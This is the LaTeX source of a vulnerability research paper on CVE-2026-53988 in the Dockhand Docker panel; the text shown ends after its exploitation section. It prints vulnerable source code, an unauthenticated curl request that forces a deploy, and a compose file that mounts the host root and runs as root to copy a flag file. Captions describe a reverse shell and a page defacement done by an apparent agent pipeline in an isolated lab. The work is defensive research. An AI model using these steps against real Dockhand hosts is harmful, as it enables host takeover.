% =============================================================================
% CVE-2026-53988 - Xpectra Security Research
% "From Anonymous Webhook POST to Root on the Managed Docker Host"
% Build: pdflatex main.tex (twice). Output renamed CVE-2026-53988-paper.pdf.
% =============================================================================
\documentclass[journal]{IEEEtran}
\usepackage[utf8]{inputenc}
\usepackage{graphicx}
\usepackage{booktabs}
\usepackage{xcolor}
\usepackage{listings}
\usepackage{hyperref}
\usepackage{microtype}
\usepackage{array}
\usepackage{needspace}
\usepackage{subcaption}

\hypersetup{colorlinks=true,linkcolor=blue,citecolor=blue,urlcolor=blue}

\definecolor{codebg}{RGB}{245,247,250}
\definecolor{codekw}{RGB}{0,90,150}
\definecolor{codecm}{RGB}{120,120,120}
\definecolor{codestr}{RGB}{160,40,40}
\definecolor{phcol}{RGB}{110,120,135}

% listings has no yaml language on this TeX Live; yargen = plain, no
% highlighting (per the trap catalog).
\lstdefinestyle{shell}{
  language={},
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize,
  frame=single,
  breaklines=true,
  breakatwhitespace=false,
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false,
  xleftmargin=0.9em, xrightmargin=0.4em,
  aboveskip=6pt, belowskip=4pt
}
\lstdefinestyle{ts}{
  language={},
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize,
  frame=single,
  breaklines=true,
  breakatwhitespace=false,
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false,
  aboveskip=6pt, belowskip=4pt,
  morecomment=[l]{//},
  commentstyle=\color{codecm}
}
\lstdefinestyle{yar}{
  language={},
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize,
  frame=single,
  breaklines=true,
  breakatwhitespace=false,
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false,
  aboveskip=6pt, belowskip=4pt
}

% Film still placeholder: a labeled frame around a token, never an invented
% screenshot. The caption states what the still will prove. 
\newcommand{\stillframe}[2]{%
  \setlength{\fboxsep}{10pt}%
  \fcolorbox{phcol}{codebg}{\parbox[c][#2][c]{\dimexpr\linewidth-2\fboxsep-2\fboxrule\relax}{\centering\ttfamily\small #1}}}
 
\newcommand{\figdir}{figures}

\begin{document}

\title{From an Anonymous Webhook POST to Root on the Managed Docker Host:
Lab-Verified Compound Chain, Fix Verification, and Live-Fired Detections for
CVE-2026-53988 (Dockhand)}

\author{Miguel Zabala\\[0.5ex]
\small Founder, Xpectra Security Research}

\markboth{From an Anonymous Webhook POST to Root on the Managed Docker Host:
CVE-2026-53988}
{Xpectra Security Research \MakeLowercase\expandafter\the\year}

\maketitle

\begin{abstract}
VulnCheck assigned CVE-2026-53988 to Dockhand, a Docker stack management panel,
for a missing-authentication flaw (CWE-306) in its git webhook endpoints: any
stack whose webhook was enabled without a configured secret could be forced to
redeploy by an unauthenticated request, CVSS 4.0 9.2 critical, CVSS 3.1 10.0.
The vendor fixed the flaw in release v1.0.40 (tagged 2026-07-31); the VulnCheck
advisory and the GHSA entry became public on 2026-09-29. The public record
describes the trigger and names the compound path (attacker branch write plus
privileged compose bind mounts); what no public source had provided is
reproducible evidence. This paper supplies it: a first reproducible end-to-end
lab chain in which a single anonymous, unsigned HTTP request causes the panel
to run \texttt{git clone} and \texttt{docker compose up} against the managed
host's Docker socket (Tier 1, no repository access required), and the same
request, after the documented prerequisite of write access to the tracked
branch, lands attacker-authored compose that executes as \texttt{uid=0} on the
managed host and reads its flag file (Tier 2). Both arms run on the real vendor
images v1.0.39 and v1.0.40, and the fix verification is non-vacuous: the
identical attacker objects reach both arms, the fixed arm answers 401, and a
correctly signed control proves its deploy path functional before any negative
verdict. We additionally document two defender-facing findings that the public
advisories omit: the free edition's \texttt{audit\_logs} table is
Enterprise-gated and was verified empty through the entire attack, and passive
version fingerprinting of the vulnerable state is impossible because the
signature check runs only after the stack lookup. A detection package (4
Suricata signatures, 2 Sigma rules, 1 YARA rule, a self-test detector, an IOC
set), every rule fired against our own recorded attack, completes the package.
All experiments ran in an isolated, zero-egress Docker network against fictional
\texttt{*.lab} hosts with a simulated managed host, stated plainly in
Section~\ref{sec:lab}; no third-party system was touched.
\end{abstract}

\begin{IEEEkeywords}
Missing authentication, webhook security, Docker, supply chain, container
escape, penetration testing, LLM agents, CVE-2026-53988.
\end{IEEEkeywords}

% =============================================================================
\section{Introduction}
\label{sec:intro}

Container management panels are small, privileged, and popular. Dockhand
(Finsys) is a SvelteKit and Bun application that manages Docker stacks through
a web UI, and the vendor's own deployment model mounts the managed host's
\texttt{docker.sock} into the panel container: whoever can make the panel
deploy a stack effectively holds the host's Docker socket. Its git integration
offers webhook endpoints so a forge (GitHub, GitLab, Gitea) can tell the panel
``there is a new commit, redeploy.'' Those endpoints are deliberately exempted
from the panel's session authentication because the signature secret is meant
to be their authentication. When the secret is unset, the guard that consumes
it is skipped, and the action survives.

That is \textbf{CVE-2026-53988}. Dockhand before 1.0.40 checks the webhook
signature only inside \texttt{if (gitStack.webhookSecret)}; the schema default
for \texttt{webhook\_secret} is NULL, so the shipped default posture for a
webhook-enabled stack is an unauthenticated ``redeploy now'' endpoint keyed by
a sequential integer stack id. The CVE record (assigner VulnCheck, credit
Katriel Moses as finder) scores CVSS 4.0 9.2 critical
(\texttt{CVSS:4.0/}\hspace{0pt}\texttt{AV:N/AC:L/AT:P/PR:N/}\hspace{0pt}\texttt{UI:N/VC:N/VI:H/VA:H/}\hspace{0pt}\texttt{SC:H/SI:H/SA:H})
and CVSS 3.1 10.0, classified CWE-306 (Missing Authentication for Critical
Function)~\cite{cverecord}.

\textbf{The public record and what it leaves out.} The fix shipped in release
v1.0.40 (tagged 2026-07-31)~\cite{vendorfix}; the VulnCheck advisory and the
GitHub security advisory GHSA-h855-x6jx-cfw2 became public on
2026-09-29~\cite{vulncheck,ghsa}. The advisory text is precise: it names the
enumeration of sequential stack ids, the forcing of \texttt{git clone} and
\texttt{docker compose} operations, and the compound to host compromise
``when combined with write access to the tracked git branch,'' via attacker
compose with privileged bind mounts. A GitHub search on 2026-09-30 found no
public exploit code. What the public record does not contain is any
reproducible evidence: no lab, no wire transcripts, no measurement of what the
pre-auth trigger actually does, no A/B proof that the fix stops the identical
objects, and nothing for defenders to detect with.

\textbf{Our contributions.} Working in an isolated, zero-egress Docker lab
(Section~\ref{sec:lab}) with the real vendor images v1.0.39 (vulnerable) and
v1.0.40 (fixed), operated end to end by the autonomous research pipeline
described in Section~\ref{sec:ethics}, with no discovery claim
(Section~\ref{sec:ethics}), we contribute:
\begin{enumerate}
\item \textbf{The first reproducible end-to-end evidence chain} for the
      compound, separated into tiers the public record collapsed into one
      sentence. Tier 1: one anonymous, unsigned POST to
      \texttt{/api/git/stacks/}\texttt{\{id\}}\texttt{/webhook} causes a real
      \texttt{git clone} and a real \texttt{docker compose up} that creates a
      container on the managed host, with zero repository access and no
      secret knowledge (Section~\ref{sec:tier1}). Tier 2: with the
      advisory-documented prerequisite of write access to the tracked branch,
      the same anonymous request lands attacker compose that runs as
      \texttt{uid=0} on the managed host and reads its flag file
      (Section~\ref{sec:tier2}).
\item \textbf{Trigger semantics that the advisories did not spell out:} both
      webhook handlers call \texttt{deployGitStack(id,} \texttt{\{force:}
      \texttt{false\}}), and the deploy fires when the sync reports a new
      commit, which the \emph{first} sync of a freshly created stack always
      does; the separate, admin-configurable \texttt{forceRedeploy} flag makes
      every webhook fire unconditionally. We show both the executing and the
      skipping responses, which is exactly what the ``force'' language covers
      and does not cover (Section~\ref{sec:semantics}).
\item \textbf{Free-edition audit blind spot:} the panel's own
      \texttt{audit\_logs} table is Enterprise-gated and was verified
      \emph{empty} through the entire attack on the free edition, so the
      product's native audit trail is not a detection layer for most
      deployments (Section~\ref{sec:detection}).
\item \textbf{Version fingerprinting is impossible passively:} the signature
      check runs only \emph{after} the stack lookup, so both the vulnerable
      and the patched build answer \texttt{404} to an unknown id; separation
      requires an authenticated-effect test against a real stack id. We ship
      the detector that does this and reports its own limits
      (Section~\ref{sec:detection}).
\item \textbf{A non-vacuous A/B fix verification} on the two vendor images:
      identical repository objects at both arms, the fixed arm answers 401,
      its sim host provably untouched, and a correctly signed legitimate call
      proves the fixed endpoint's deploy path functional \emph{before} any
      blocked verdict (Section~\ref{sec:fix}).
\item \textbf{A live-fired detection package:} 4 Suricata signatures (attempt,
      execution, defense, silent setter), 2 Sigma rules, 1 YARA rule, an IOC
      set, and a self-test detector; every rule fired (or, for negative
      controls, correctly stayed silent) against our own recorded attack,
      including two defender-facing engine findings we document as pitfalls
      (Section~\ref{sec:detection}).
\end{enumerate}

Section~\ref{sec:vuln} characterizes the flaw and its trust chain;
Section~\ref{sec:lab} the lab; Section~\ref{sec:exploit} the two-tier
exploitation evidence; Section~\ref{sec:fix} fix verification;
Section~\ref{sec:detection} detections; Section~\ref{sec:remediation}
remediation and incident response; Section~\ref{sec:ethics} ethics,
limitations, reproducibility, and the agent pipeline;
Section~\ref{sec:conclusion} concludes. Every claim traces to an evidence file
in the companion case folder \texttt{CVE-2026-53988/}.

% =============================================================================
\section{Vulnerability Characterization}
\label{sec:vuln}

\subsection{The component stack}

Dockhand is a single container (SvelteKit server on Bun or Node, SQLite by
default) that manages \emph{other} hosts' containers. In the vendor's own
deployment compose~\cite{vendorrepo} the panel receives the managed host's
Docker socket (\texttt{/var/run/docker.sock} mounted at
\texttt{/host-docker}), plus its config and data volumes. The trust placed in
that mount is total: any deploy the panel performs is the \texttt{docker
compose} CLI talking to the host daemon.

A ``git stack'' pairs a repository URL and branch with a compose file path.
Two webhook routes exist to trigger a redeploy: \texttt{POST} (and
\texttt{GET}) \texttt{/api/git/}\allowbreak\texttt{webhook/\{id\}} and the
stack-oriented \texttt{/api/git/}\allowbreak\texttt{stacks/\{id\}/webhook}.
Both were present in the analyzed v1.0.39 source~\cite{vendorrepo}.

\subsection{The vulnerable code}

Listing~\ref{lst:hooks} shows the authentication middleware in v1.0.39: the
two webhook routes are matched \emph{before} the public-path list, with the
comment stating that they ``have their own auth (signature/secret
verification).'' That assumption is the vulnerability's first half.

\begin{lstlisting}[style=ts,label={lst:hooks},
caption={v1.0.39 \texttt{src/hooks.server.ts}: the webhook routes are exempt
from session auth because signature verification is assumed to cover them
(source, upstream repository~\cite{vendorrepo})}]
// Webhook endpoints have their own auth (signature/secret verification)
if (pathname.match(/^\/api\/git\/stacks\/\d+\/webhook$/)) return true;
if (pathname.match(/^\/api\/git\/webhook\/\d+$/)) return true;

return PUBLIC_PATHS.some(path =>
    pathname === path || pathname.startsWith(path + '/'));
\end{lstlisting}

Listing~\ref{lst:webhook} shows the second half: the signature check lives
inside \texttt{if (gitStack.webhookSecret)}. The Drizzle schema declares
\texttt{webhookSecret: text('webhook\_secret')} with no default and no
not-null~\cite{vendorrepo}, and the stack-create API stores
\texttt{webhookSecret || null}. A stack with \texttt{webhookEnabled=true} and
\texttt{webhook\_secret=NULL} (the shipped free-tier default when an admin
enables the webhook and leaves the optional secret empty) therefore reaches
\texttt{deployGitStack()} with no authentication of any kind. The
\texttt{GET} handler carries the same null-guard shape with a query-parameter
secret (\texttt{if (gitStack.webhookSecret \&\& secret !==}
\texttt{gitStack.webhookSecret)}), verified in the same source file
(Section~\ref{sec:exploit} notes what we executed in the lab).

\begin{minipage}{\dimexpr\columnwidth-10pt}
\begin{lstlisting}[style=ts,label={lst:webhook},
caption={v1.0.39
\texttt{src/routes/}\allowbreak\texttt{api/git/}\allowbreak\texttt{stacks/}\allowbreak\texttt{[id]/}\allowbreak\texttt{webhook/}\allowbreak\texttt{+server.ts}
(POST handler, abridged): verification is skipped exactly when the secret is
NULL, and the unauthenticated deploy call follows}]
const gitStack = await getGitStack(id);
if (!gitStack) return json({ error: 'Git stack not found' },
                           { status: 404 });
if (!gitStack.webhookEnabled)
    return json({ error: 'Webhook is not enabled for this stack' },
                { status: 403 });

// Verify webhook secret if set
if (gitStack.webhookSecret) {
    const payload = await request.text();
    const signature = request.headers.get('x-hub-signature-256')
                   || request.headers.get('x-gitlab-token');
    if (!verifySignature(payload, signature, gitStack.webhookSecret))
        return json({ error: 'Invalid webhook signature' },
                    { status: 401 });
}

// Deploy the git stack (syncs and deploys only if there are changes)
const result = await deployGitStack(id, { force: false });
return json(result);
\end{lstlisting}
\end{minipage}

The vendor fix (v1.0.40) inverts the guard: a NULL secret is itself a 401
condition (\texttt{'Webhook secret is not configured for this stack'}), a
shared \texttt{verifyWebhookSignature()} module with constant-time comparison
serves both routes and both header families, the stack create/update APIs
refuse \texttt{webhookEnabled} without a secret, and a new
\texttt{git-url-safety.ts} rejects \texttt{ext::}/\texttt{fd::}/\texttt{file://}
transports, option-leading URLs and refs, and \texttt{composePath} values that
escape the clone directory~\cite{vendorfix}. We verified each of these
statements against the local \texttt{v1.0.39} to \texttt{v1.0.40} diff, and
two of them (mandatory secret, create-time refusal) by execution in
Section~\ref{sec:fix}.

\subsection{The trust chain, hop by hop}

\begin{figure*}[t]
\centering
\includegraphics[width=\textwidth]{\figdir/fig-chain.png}
\caption{The chain from anonymous request to host root, with the two trust
breaks marked red and the v1.0.40 fix points marked green. Hop 1 exempts the
route from session auth; hop 2 skips signature verification when the secret is
NULL; hop 3 enters \texttt{deployGitStack}; hop 4 turns attacker branch text
into a compose file on disk; hop 5 executes it with the panel's host socket
authority. This figure proves the shape of the compound: no hop between the
socket-less anonymous request and \texttt{execve} on the managed host
reintroduces authentication.}
\label{fig:chain}
\end{figure*}

Fig.~\ref{fig:chain} traces the five hops. Their character is worth naming
precisely.

\textbf{Hop 1 (design):} the webhook routes sit outside session auth. This is
deliberate; webhooks cannot hold session cookies. The design is only sound if
the signature check is inescapable.

\textbf{Hop 2 (the defect):} the check is conditional on a column whose
default is NULL. Two reasonable local decisions, ``secret is optional'' in the
data model and ``verify if present'' in the handler, compose into
\texttt{CWE-306}: a critical function (force deployments on a socket-bearing
host) reachable with \texttt{PR:N}, no user interaction, and no
shared secret. This is the flaw the CVE describes.

\textbf{Hops 3 to 5 (the blast radius):} the panel's sync clones the tracked
branch (a git client run by the panel, not by the caller), and the deploy
hands the repository's compose file, unmodified in the dangerous respect, to
\texttt{docker compose up -d --remove-orphans} against the managed host
socket. Compose bind mounts are honored because they are the feature: no
vulnerability is needed for \texttt{- /:/hostroot} to be powerful. The panel
is the authenticator, the clone is the delivery mechanism, and compose is the
execution mechanism; the compound the advisory describes is the arithmetic sum
of these three ordinary parts.

\subsection{Trigger semantics}
\label{sec:semantics}

The advisory phrase ``force git clone and \texttt{docker compose}
operations'' deserves lab-precise semantics, because both outcomes were
observed. Both handlers call \texttt{deployGitStack(id,} \texttt{\{force:}
\texttt{false\}}). The sync inside always runs a fetch/clone (and in our
transcripts, a fresh clone per deploy directory), and the redeploy fires when
the sync reports \texttt{updated=true}: a new commit on the tracked branch, or
the first sync of a newly created stack, which is unconditionally
\texttt{updated=true} (panel log: \texttt{Will force recreate:}
\texttt{true (updated=true)}). With no pending change, the same anonymous
request is answered \texttt{\{"success":true,}\texttt{"output":"No changes}
\texttt{detected, skipping redeploy","skipped":true\}} after HTTP 200, reached
without any credential, which is itself evidence the pre-auth handler ran. The
stock \texttt{forceRedeploy} stack flag (admin-configurable, visible in the
stack API output we captured) makes every webhook redeploy unconditionally.
Attacker-relevant consequence: an anonymous request can (i) trigger the first
deploy of any stack created after the last panel start, (ii) redeploy
immediately after any legitimate push, racing or replacing it, and (iii) with
\texttt{forceRedeploy} set, recreate stacks on demand. Our Tier-1 evidence
instantiates (i) and (ii); Section~\ref{sec:lab} logs the two early runs that
instantiated the skipping path and how they shaped this reading.

\subsection{Preconditions}
\label{sec:precond}

Tier 1 requires: the panel reachable on the network; a stack with
\texttt{webhookEnabled=true} and \texttt{webhook\_secret=NULL} (the shipped
default when the optional secret is left empty); and a stack id, which is a
sequential integer, enumerable, and additionally oracle'd by the
\texttt{404}\allowbreak\texttt{\{"error":"Git stack not found"\}} versus
\texttt{403} versus \texttt{200} response differences visible to anonymous
requesters. Tier 2 adds the advisory's documented prerequisite: write access
to the tracked branch (an insider, a compromised developer credential, a
botched fork contribution, or any forge misconfiguration that opens push).
The CVSS 4.0 \texttt{AT:P} (attack requirements present) encodes exactly this
conditional compound; CVSS 3.1 carries it as \texttt{S:C} with CIA all High,
hence 10.0. Our lab instantiates the branch-write prerequisite as a
deliberately open git daemon (condition S-C, Section~\ref{sec:lab}) so that
the compound can be measured rather than asserted.

% =============================================================================
\section{Lab, Methodology, and Integrity Controls}
\label{sec:lab}

\subsection{Isolated topology}

All experiments ran inside one Docker network, \texttt{dh53988}, created
\texttt{--internal} on subnet \texttt{172.30.53.0/24}: no route to any
external network exists at runtime, verified by \texttt{verify.sh} checking
\texttt{Internal=true} on the network before every run. The only egress in the
whole lifecycle is the documented, one-time image pull of stock upstream
images (\texttt{fnsys/dockhand:v1.0.39}, \texttt{fnsys/dockhand:v1.0.40},
\texttt{docker:28-dind}, \texttt{alpine}) and \texttt{apk} packages for the
git server image. All hostnames are fictional (\texttt{git.lab},
\texttt{host-sim.lab}, \texttt{panel-v.lab}); the attacker side is the lab
host at \texttt{172.30.53.1}.

\begin{figure*}[t]
\centering
\includegraphics[width=\textwidth]{\figdir/fig-topology.png}
\caption{Lab topology (drawn from \texttt{lab/lab-compose.yaml} and
\texttt{verify.sh} facts). Two Dockhand arms on the real vendor images share
one tracked git repository, each with its own simulated managed host so arm
effects cannot collide; the fixed arm exists to make the negative test in
Section~\ref{sec:fix} non-vacuous. The red loop marks the measured payoff:
root-owned canaries, the flag file, and the defaced page from the film, all
inside the isolated network. This figure proves the A/B design: one variable
(panel version) between identical conditions.}
\label{fig:topo}
\end{figure*}

Fig.~\ref{fig:topo} shows the layout. \textbf{Target images:} the vendor
containers \texttt{fnsys/dockhand:v1.0.39} and \texttt{fnsys/dockhand:}\allowbreak\texttt{v1.0.40},
configured exclusively through the product's own HTTP API (provisioning in
\texttt{lab/provision.sh}, first-admin path, auth on, stack create); no
database surgery, no binary modification, no patched-build surgery anywhere in
this paper. \textbf{Managed hosts:} each arm manages its own
\texttt{docker:28-dind} container as a \emph{simulated} managed host: the
vendor's documented socket mount is reproduced (the daemon's socket is bound
on a shared volume the panel container mounts), and the simulated host carries
the objective file \texttt{/flag.txt} =
\texttt{DH53988\{}\allowbreak\texttt{dind-sim-host-escape-}\allowbreak\texttt{cve-2026-53988\}}.
The \texttt{alpine} image is preloaded into both sim hosts (\texttt{docker}
\texttt{load}) so stack containers start with zero network egress; the
preloaded image is a documented lab precondition.

\subsection{Documented lab conditions}

\begin{itemize}
\item \textbf{S-A (attack surface hardening, in our favor):} panel
      authentication is enabled with a local admin account, so every
      \emph{protected} API returns \texttt{401} to anonymous callers
      (\texttt{verify.sh} asserts
      \texttt{GET /api/stacks} $\rightarrow$ \texttt{401} on both arms). The
      webhook bypass is therefore pre-auth in the strongest sense: no
      half-configured instance, auth genuinely on.
\item \textbf{S-B (vulnerable posture):} the vulnerable arm's git stack
      (\texttt{edge-cache}, tracked from \texttt{git://172.30.53.10/}\allowbreak\texttt{stack.git},
      branch \texttt{main}) is created through the API with
      \texttt{webhookEnabled=true} and \textbf{no} secret, which the create
      API stores as \texttt{NULL} (captured in
      \texttt{evidence/tier1-20260930-200835/}\allowbreak\texttt{stack-create.json}:
      \texttt{"webhookEnabled":}\allowbreak\texttt{"true,"}\allowbreak\texttt{"webhookSecret":}\allowbreak\texttt{"null"}). This is shipped
      default posture, not a custom lab state.
\item \textbf{S-C (Tier-2 prerequisite):} the lab git server runs
      \texttt{git daemon --export-all --enable=receive-pack}, i.e.\ anonymous
      push allowed. This is the advisory's ``write access to the tracked
      git branch'' modeled as a lab condition, stated here because the Tier-2
      result must not be read as achievable without it.
\item \textbf{S-D (fixed-arm parity):} v1.0.40's create API refuses
      \texttt{webhookEnabled} with a null secret, so the fixed arm is
      provisioned with a configured secret. This asymmetry is forced by the
      fix itself (you cannot configure a patched product into the vulnerable
      posture through its own API) and is exactly what makes the A/B
      meaningful: NULL-posture equivalence lives on the vulnerable arm, and
      the fixed arm is exercised with the identical attacker objects plus a
      signed positive control (Section~\ref{sec:fix}).
\end{itemize}

\subsection{Protocol and integrity controls}

A precondition gate (\texttt{lab/verify.sh}) runs read-only before every
attack or re-run: containers up, network internal, auth enforced, repo
served, daemons healthy, flag present, socket visible to each panel, per-arm
webhook posture, and version strings differing. Exploitation follows
canary-first discipline: Tier 1's proof is the legitimate benign compose
creating its own container on the managed daemon (the ``canary'' is the sink's
normal effect, captured by daemon state, not by attacker code); only Tier 2
executes attacker-authored content, and its payload is a two-file canary
(\texttt{id} output and the flag copy), no persistence, no destruction.
Evidence folders are timestamped and hold the raw transcripts this paper
quotes: requests, response headers and bodies, \texttt{docker ps} and
\texttt{docker inspect} before/mid/after, panel container logs, and the host
the host canary files (\texttt{evidence/}\allowbreak\texttt{tier1-20260930-}\allowbreak\texttt{200835/},
\texttt{evidence/}\allowbreak\texttt{tier2-20260930-}\allowbreak\texttt{201100/}).

\textbf{Attempt log.} Nine timestamped evidence folders
survive from two iteration rounds. Runs \texttt{tier1-}\allowbreak\texttt{20260930-200206}
and \texttt{-200433} produced HTTP 200 \texttt{"skipped":true} with an empty
\texttt{ps-after}: the trigger reached the handler pre-auth, but the target
stack had already synced, so nothing redeployed; these runs defined the
first-sync semantics of Section~\ref{sec:semantics} and the harness was then
changed to create a fresh stack per run (\texttt{tier1-}\allowbreak\texttt{20260930-200835}
and later, executing). \texttt{tier2-20260930-200857} pushed a compose change
but fired the webhook before the sync picked it up and landed nothing
(empty canaries); \texttt{-201029} and \texttt{-201100} land cleanly, and
\texttt{-201100} is the cited run. Nothing in the paper cites a run that the
harness did not verify end to end.

% =============================================================================
\section{Exploitation Evidence}
\label{sec:exploit}

\begin{table}[t]
\centering
\footnotesize
\setlength{\tabcolsep}{3pt}
\begin{tabular}{@{}p{2.15cm}p{2.6cm}p{2.85cm}@{}}
\toprule
Action (anonymous) & v1.0.39 arm & v1.0.40 arm \\
\midrule
\texttt{POST .../1/}\hspace{0pt}\texttt{webhook}, fresh stack &
\texttt{200}, clone + compose + container \textbf{created} &
\texttt{401} \texttt{Invalid} \texttt{webhook} \texttt{signature} \\
\texttt{POST} at unchanged HEAD &
\texttt{200} \texttt{"skipped":true} (handler ran pre-auth) &
\texttt{401} \\
\texttt{POST} unknown id & \texttt{404} \texttt{Git stack not found} &
\texttt{404} (same; see Sec.~\ref{sec:detection}) \\
signed \texttt{POST} (correct secret) & n/a (no secret exists) &
\texttt{200}, deploys (control) \\
\texttt{GET} variant & same null-guard shape verified in source; not
executed in lab & same mandatory-secret guard in source; not executed in lab \\
\bottomrule
\end{tabular}
\caption{Trigger matrix as executed in the lab (transcripts in the cited
evidence folders; the GET row is verified in source only and marked as such).}
\label{tab:trigger}
\end{table}

Table~\ref{tab:trigger} summarizes what was executed. The remainder of this
section walks the two tiers.

\subsection{Tier 1: one anonymous POST, one real deploy}
\label{sec:tier1}

The attack is one request. Listing~\ref{lst:tier1req} is the wire form from
\texttt{exploit/tier1-webhook.sh} (run \texttt{tier1-20260930-}\allowbreak\texttt{200835},
all headers and bodies archived): no cookie, no authorization header, no
signature, a JSON body that a forge would barely bother to send.

\begin{lstlisting}[style=shell,label={lst:tier1req},
caption={The complete Tier-1 attack as issued by an unauthenticated client
(from \texttt{exploit/tier1-webhook.sh}; target \texttt{172.30.53.21:3000},
\texttt{fnsys/dockhand:v1.0.39})}]
curl -s -D resp.headers -o resp.body \
  -X POST http://172.30.53.21:3000/api/git/stacks/4/webhook \
  -H 'Content-Type: application/json' \
  -d '{"ref":"refs/heads/main"}'
\end{lstlisting}

The response (Listing~\ref{lst:tier1resp}) is the sink's own log of itself:
HTTP \texttt{200}, \texttt{success:true}, the compose output naming the
network and container it created, and the exact \texttt{docker compose}
command line that ran. The admin-visible proof lands simultaneously in the
panel log: \texttt{DEPLOY GIT STACK START}, \texttt{Cloning repository...},
\texttt{Current commit: 60b5f20}, \texttt{Updated: true}, \texttt{Calling}
\texttt{deployStack...}.

\begin{lstlisting}[style=shell,label={lst:tier1resp},
caption={Archived response to the Tier-1 request (\texttt{resp.headers} and
\texttt{resp.body}, run \texttt{evidence/tier1-20260930-200835/}, line-wrapped
for print): HTTP 200, \texttt{success:true}, and the compose command line the
panel itself ran against the managed socket}]
HTTP/1.1 200 OK          Date: Thu, 01 Oct 2026 01:08:35 GMT
content-type: application/json
{"success":true,"output":" Network tier1-1790816915_default
Creating \n Network tier1-1790816915_default Created \n
Container edge-cache Creating \n Container edge-cache Created \n
Container edge-cache Starting \n Container edge-cache Started \n",
"command":"docker compose -p tier1-1790816915 -f /app/data/stacks/
tier1-1790816915/compose.yaml up -d --remove-orphans --force-recreate"}
\end{lstlisting}

On the managed (simulated) host, \texttt{ps-before} and \texttt{ps-mid} are
empty; \texttt{ps-after} shows the container, and \texttt{inspect.txt} pins
it: id \texttt{74fedaca38ff}, started \texttt{2026-10-01T01:08:35.83Z},
project label \texttt{tier1-1790816915}, i.e.\ created \emph{within the same
second} as the anonymous request; the request itself completed after the
deploy (the handler is synchronous), so POST to visible container is
$\approx$1\,s end to end, and the detector run measured 0.4\,s response
with the effect independently verified. The compose file the panel deployed
was the \emph{benign} tracked one (an \texttt{alpine} loop); Tier 1 proves
the authority, not the payload.

\begin{figure}[t]
\centering
\includegraphics[width=\columnwidth]{\figdir/fig-webhook-resp.png}
\caption{Film still from the case recording (take beat
\texttt{push\_trigger}): the unsigned POST typed at the attacker terminal,
answered \texttt{\{"success":true,\dots"Container edge-cache Created
\dots Started"\}} with the \texttt{docker compose \dots up -d} command the
panel itself ran, in the same frame. Proves Tier 1 live: no credentials
typed, deployment executed on the managed host.}
\label{fig:webhookresp}
\end{figure}

\textbf{Enumeration.} The same run then POSTs to ids \texttt{5} and
\texttt{99} anonymously: both answer \texttt{404} with
\texttt{\{"error":"}\allowbreak\texttt{"Git stack not found"\}}, while the
live id answered \texttt{200}. Sequential ids plus this differential make the
fleet enumerable and mass-triggerable by an anonymous scanner; the same
differential is what defeats passive fingerprinting (Section~\ref{sec:detection}).

\subsection{Tier 2: branch write, anonymous trigger, host root}
\label{sec:tier2}

With condition S-C in force (attacker holds push on \texttt{main}, the
advisory's documented prerequisite), the attacker commits the compose of
Listing~\ref{lst:evil} and fires the same anonymous POST against the
long-lived \texttt{edge-cache} stack (id 1).

\begin{minipage}{\dimexpr\columnwidth-10pt}
\begin{lstlisting}[style=shell,label={lst:evil},
caption={The pushed compose verbatim
(\texttt{evidence/tier2-20260930-}\allowbreak\texttt{201100/malicious-compose.yaml}):
the bind mount is the compound, the \texttt{command} block is the canary}]
services:
  takeover:
    image: alpine:latest
    container_name: takeover
    volumes:
      - /:/hostroot
    command:
      - sh
      - -c
      - |
        id > /hostroot/tier2-canary
        cat /hostroot/flag.txt > /hostroot/looted-flag.txt \
          2>/dev/null || echo NOFLAG > /hostroot/looted-flag.txt
        echo takeover-alive >> /hostroot/tier2-canary
        sleep 300
\end{lstlisting}
\end{minipage}

The anonymous POST is answered \texttt{200} with \texttt{Container takeover}
\texttt{Created / Started} in the compose output; \texttt{docker inspect} on
the managed host records the bind as \texttt{["/:/hostroot:rw"]} (run
\texttt{tier2-20260930-}\allowbreak\texttt{201100}). Four seconds later the
host filesystem itself carries the proof (Listing~\ref{lst:canaries}): the
canary is owned by \texttt{root}, its first line is the \texttt{id} output of
a \texttt{uid=0} process, and the flag file's contents now sit in a second
root-owned file the container wrote \emph{through the mount}, which proves
simultaneously that attacker-chosen code executed and that the managed host's
entire filesystem is in its write path.

\begin{minipage}{\dimexpr\columnwidth-10pt}
\begin{lstlisting}[style=shell,label={lst:canaries},
caption={Host-side verification from outside the container
(\texttt{evidence/}\allowbreak\texttt{tier2-20260930-}\allowbreak\texttt{201100/}\allowbreak\texttt{host-}\allowbreak\texttt{canaries.txt}): root-owned
canaries on the simulated managed host prove \texttt{uid=0} execution and full
filesystem reach}]
$ docker exec dh53988-dind ls -la /tier2-canary /looted-flag.txt
-rw-r--r-- 1 root root  45 Oct  1 01:11 /looted-flag.txt
-rw-r--r-- 1 root root 153 Oct  1 01:11 /tier2-canary
$ docker exec dh53988-dind cat /tier2-canary
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),
3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
takeover-alive
$ docker exec dh53988-dind cat /looted-flag.txt
DH53988{dind-sim-host-escape-cve-2026-53988}
\end{lstlisting}
\end{minipage}

\begin{figure*}[t]
\centering
\begin{subfigure}[t]{0.44\textwidth}
\centering
\includegraphics[width=\textwidth]{\figdir/fig-shell-root.png}
\caption{Two frames from the recording: the reverse shell answering
\texttt{uid=0(root)} at \texttt{[root@dh53988-dind \textasciitilde]\#}, and
the mounted host listing plus \texttt{cat /hostroot/flag.txt} returning the
fixture flag.}
\end{subfigure}
\hfill
\begin{subfigure}[t]{0.54\textwidth}
\centering
\includegraphics[width=\textwidth]{\figdir/fig-deface.png}
\caption{Browser render of \texttt{172.30.53.20:8080} served from the managed
host, bearing the literal \texttt{Pwend by Xpectra Agent!}.}
\end{subfigure}
\caption{Film stills from the case recording (extracted from the raw take, so
no burned subtitle or watermark rides the figure). (a) Proves the Tier-2
payoff: \texttt{uid=0} execution and flag loot on the simulated managed host
(the machine-checkable twin is Listing~\ref{lst:canaries}). (b) Proves host-side
integrity impact is visible to any visitor: after the compound, the managed
host at \texttt{172.30.53.20:8080} serves the defacement page, written into
the host filesystem through \texttt{nsenter} into PID 1's mount namespace and
served by a one-line \texttt{node} HTTP listener (the lab's busybox carries no
\texttt{httpd} applet; same wire, same claim, per the take script).}
\label{fig:stills}
\end{figure*}

